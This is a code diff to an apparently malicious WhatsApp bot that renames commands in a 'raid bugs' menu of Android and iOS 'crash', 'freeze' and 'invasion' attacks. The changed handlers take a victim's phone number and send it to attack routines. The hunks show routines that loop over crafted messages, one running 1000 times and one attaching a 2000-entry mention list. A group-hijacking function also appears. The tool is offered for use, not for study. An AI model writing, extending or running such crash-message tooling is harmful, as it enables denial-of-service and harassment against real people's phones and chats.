@@ -429,7 +429,7 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
                       title: '「☠︎」 Android Bugs',
                       rows: [
                         { header: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    title: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    description: 'Android crash attack',   id: 'btn_neon-android'   },
-                        { header: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', title: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', description: 'Android freeze attack',  id: 'btn_neon-freeze' },
+                        { header: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', title: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', description: 'Android freeze attack',  id: 'btn_neon-devine-freeze' },
                         { header: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    title: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    description: 'Android delay attack',   id: 'btn_neon-delay'    }
                       ]
                     },
@@ -438,7 +438,7 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
                       rows: [
                         { header: '「☠︎」ʀᴀɪᴅɪᴏs',        title: '「☠︎」ʀᴀɪᴅɪᴏs',        description: 'iOS crash attack',        id: 'btn_neon-ios'        },
                         { header: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', title: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', description: 'iOS invasion attack',     id: 'btn_neon-invasion' },
-                        { header: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  title: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  description: 'iOS freeze attack',       id: 'btn_neon-obito'   }
+                        { header: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  title: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  description: 'iOS freeze attack',       id: 'btn_neon-freeze'   }
                       ]
                     },
                     {
@@ -634,8 +634,8 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
       await askForTarget(sock, chatId, sessionKey, 'neon-android', 'NEON ANDROID 🤖', fakeQuote);
       break;
 
-    case 'btn_neon-freeze':
-      await askForTarget(sock, chatId, sessionKey, 'neon-freeze', 'NEON FREEZE 🤖', fakeQuote);
+    case 'btn_neon-devine-freeze':
+      await askForTarget(sock, chatId, sessionKey, 'neon-devine-freeze', 'NEON FREEZE 🤖', fakeQuote);
       break;
 
     case 'btn_neon-delay':
@@ -650,8 +650,8 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
       await askForTarget(sock, chatId, sessionKey, 'neon-invasion', 'NEON INVASION 🍎', fakeQuote);
       break;
 
-    case 'btn_neon-obito':
-      await askForTarget(sock, chatId, sessionKey, 'neon-obito', 'NEON OBITO 🍎', fakeQuote);
+    case 'btn_neon-freeze':
+      await askForTarget(sock, chatId, sessionKey, 'neon-freeze', 'NEON OBITO 🍎', fakeQuote);
       break;
 
     case 'btn_neon-gc':
@@ -1509,20 +1509,20 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
           }
 
           // ── NEON FREEZE ──
-          case 'neon-freeze': {
+          case 'neon-devine-freeze': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingNeonCommand(sock, chatId, 'neon-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-devine-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}neon-freeze 2348xxxxxxxxx*`,
+                  `*${prefix}neon-devine-freeze 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
@@ -1572,20 +1572,20 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
           }
 
           // ── NEON OBITO (NEW — PLACEHOLDER) ──
-          case 'neon-obito': {
+          case 'neon-freeze': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingNeonCommand(sock, chatId, 'neon-obito', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}neon-obito 2348xxxxxxxxx*`,
+                  `*${prefix}neon-freeze 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
@@ -1838,7 +1838,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
 
     // ── NEON FREEZE ──
     // Uses: BetaDelay + epcihDiley
-    case 'neon-freeze': {
+    case 'neon-devine-freeze': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -1864,7 +1864,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ neon-freeze round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-devine-freeze round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -1882,7 +1882,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ neon-freeze error:'), e.message);
+        console.error(chalk.red('❌ neon-devine-freeze error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
@@ -1998,7 +1998,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
 
     // ── NEON OBITO ──
     // Uses: NativeXFcWithDozerX + BetaTester
-    case 'neon-obito': {
+    case 'neon-freeze': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -2024,7 +2024,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ neon-obito round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-freeze round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -2042,7 +2042,7 @@ async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ neon-obito error:'), e.message);
+        console.error(chalk.red('❌ neon-freeze error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
@@ -2389,7 +2389,7 @@ async function hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwn
 
 const crypto = require('crypto');
 
-// ── BetaDelay (neon-freeze wave 1) ──
+// ── BetaDelay (neon-devine-freeze wave 1) ──
 async function _betaDelay(sock, target, ptcp = true) {
   for (let r = 0; r < 1000; r++) {
     let msg = generateWAMessageFromContent(target, {
@@ -2559,7 +2559,7 @@ async function _sendCombo(sock, target) {
   }).catch(e => console.error('_sendCombo news:', e.message));
 }
 
-// ── epcihDiley (neon-freeze wave 2) ──
+// ── epcihDiley (neon-devine-freeze wave 2) ──
 async function _epcihDiley(sock, target) {
   try {
     await sock.relayMessage(target, {
@@ -3056,7 +3056,7 @@ async function _protocolbug3(sock, target, mention = true) {
   }
 }
 
-// ── NativeXFcWithDozerX (neon-obito wave 1) ──
+// ── NativeXFcWithDozerX (neon-freeze wave 1) ──
 async function _nativeXFcWithDozerX(sock, target) {
   const delayMs = ms => new Promise(res => setTimeout(res, ms));
   const SID = '5e03e0&mms3';
@@ -3310,7 +3310,7 @@ async function _nativeXFcWithDozerX(sock, target) {
   }
 }
 
-// ── BetaTester (neon-obito wave 2) ──
+// ── BetaTester (neon-freeze wave 2) ──
 async function _betaTester(sock, target, mention = true) {
   const mentionList = Array.from({ length: 2000 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);
   const msg = await generateWAMessageFromContent(target, {
